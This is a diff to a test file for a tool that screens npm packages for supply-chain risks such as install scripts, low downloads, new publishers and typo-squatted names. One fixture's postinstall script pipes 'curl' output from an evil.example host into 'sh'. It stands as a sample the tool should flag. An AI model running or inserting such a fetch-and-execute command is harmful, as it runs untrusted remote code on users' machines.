@@ -1,4 +1,6 @@
 import { test } from 'node:test';
+
+process.env.INSTALLGUARD_NO_CACHE = '1';
 import assert from 'node:assert/strict';
 
 import { assess, checkPackages, verdictOf } from '../src/analyze.js';
@@ -61,7 +63,7 @@ test('brand-new, unpopular package with a suspicious install script', () => {
     hasRepository: false,
     installScripts: { postinstall: 'curl -s https://evil.example/x.sh | sh' },
   };
-  const f = assess(npm('fast-json-parsr'), meta, { now: NOW });
+  const f = assess(npm('totally-new-thing'), meta, { now: NOW });
   assert.deepEqual(
     codes(f).sort(),
     ['INSTALL_SCRIPT', 'LOW_DOWNLOADS', 'NEW_PACKAGE', 'NO_REPOSITORY', 'SINGLE_VERSION'].sort(),
@@ -108,8 +110,9 @@ test('checkPackages uses the registry and honours the allow list', async () => {
   const calls = [];
   const http = async (url) => {
     calls.push(url);
-    if (url.includes('/downloads/')) return { status: 200, data: { downloads: 2_000_000 } };
-    if (url.endsWith('/ghost-pkg')) return { status: 404, data: null };
+    if (url.includes('/downloads/')) return { status: 200, data: { downloads: url.includes('zq-test-ghost') ? 0 : 20 } };
+    if (url.includes('/-/v1/search')) return { status: 200, data: { objects: [] } };
+    if (url.endsWith('/zq-test-ghost-pkg')) return { status: 404, data: null };
     return {
       status: 200,
       data: {
@@ -123,20 +126,38 @@ test('checkPackages uses the registry and honours the allow list', async () => {
       },
     };
   };
-  const results = await checkPackages([npm('real-pkg'), npm('ghost-pkg'), npm('internal-thing')], {
+  const results = await checkPackages([npm('zq-test-real-pkg'), npm('zq-test-ghost-pkg'), npm('internal-thing')], {
     http,
     allow: ['internal-thing'],
     now: NOW,
   });
-  assert.deepEqual(results.map((r) => r.verdict), ['ok', 'block', 'ok']);
+  assert.deepEqual(results.map((r) => r.verdict), ['caution', 'block', 'ok']); // real-pkg: only 20 downloads
   assert.equal(results[0].meta.version, '2.0.0');
   assert.equal(results[2].allowed, true);
   assert.ok(!calls.some((u) => u.includes('internal-thing')));
 });
 
+test('popular packages use small endpoints, never the full document', async () => {
+  const calls = [];
+  const http = async (url) => {
+    calls.push(url);
+    if (url.includes('/downloads/')) return { status: 200, data: { downloads: 9_000_000 } };
+    if (url.includes('/-/v1/search'))
+      return { status: 200, data: { objects: [{ package: { name: 'big', version: '3.1.0', date: daysAgo(40) }, downloads: { weekly: 9_000_000 } }] } };
+    if (url.endsWith('/big/latest') || url.endsWith('/big/3.1.0'))
+      return { status: 200, data: { version: '3.1.0', repository: {}, _npmUser: { name: 'alice' } } };
+    throw new Error('unexpected ' + url);
+  };
+  const [r] = await checkPackages([npm('big')], { http, now: NOW });
+  assert.equal(r.verdict, 'ok');
+  assert.equal(r.meta.version, '3.1.0');
+  assert.ok(calls.every((u) => !/registry\.npmjs\.org\/big$/.test(u)));
+});
+
 test('trusted (CI-verified) publishing is not flagged as a new publisher', async () => {
   const http = async (url) => {
-    if (url.includes('/downloads/')) return { status: 200, data: { downloads: 5_000_000 } };
+    if (url.includes('/downloads/')) return { status: 200, data: { downloads: 20_000 } };
+    if (url.includes('/-/v1/search')) return { status: 200, data: { objects: [] } };
     const v = (n, user, extra = {}) => ({ _npmUser: { name: user, ...extra } });
     return {
       status: 200,
@@ -151,7 +172,19 @@ test('trusted (CI-verified) publishing is not flagged as a new publisher', async
       },
     };
   };
-  const [r] = await checkPackages([npm('lib')], { http, now: NOW });
+  const [r] = await checkPackages([npm('zq-test-lib-xyz')], { http, now: NOW });
   assert.equal(r.meta.newPublisher, false);
   assert.equal(r.verdict, 'ok');
+});
+
+test('minimum release age policy blocks very fresh releases', () => {
+  const meta = { ...healthy, versionPublished: daysAgo(0.5) };
+  assert.equal(verdictOf(assess(npm('some-lib'), meta, { now: NOW })), 'ok');
+  assert.equal(verdictOf(assess(npm('some-lib'), meta, { now: NOW, minReleaseAgeDays: 2 })), 'danger');
+  assert.equal(verdictOf(assess(npm('some-lib'), { ...healthy, versionPublished: daysAgo(5) }, { now: NOW, minReleaseAgeDays: 2 })), 'ok');
+});
+
+test('naming families are not typos of each other', () => {
+  assert.equal(findLookalike('pypi', 'tree-sitter-hcl'), null);
+  assert.ok(findLookalike('npm', 'expresss'));
 });
